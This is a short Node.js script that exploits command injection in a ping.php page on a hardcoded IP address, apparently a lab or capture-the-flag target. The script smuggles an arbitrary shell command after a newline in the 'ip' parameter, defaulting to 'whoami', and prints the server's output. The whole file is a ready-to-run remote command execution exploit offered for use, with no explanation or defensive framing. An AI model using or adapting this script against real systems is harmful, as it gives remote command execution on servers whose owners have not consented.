const got = require('got')

const HOST = 'http://120.55.43.255:21173/'

const execute = async (command) => {
  let response = await got(`${HOST}/ping.php`, {
    searchParams: {
      ip: `8.8.8.8\n${command}`,
    },
  })
  return response.body
}

;(async () => {
  let command = process.argv.slice(2)[0] || 'whoami'
  console.log(await execute(command))
})()
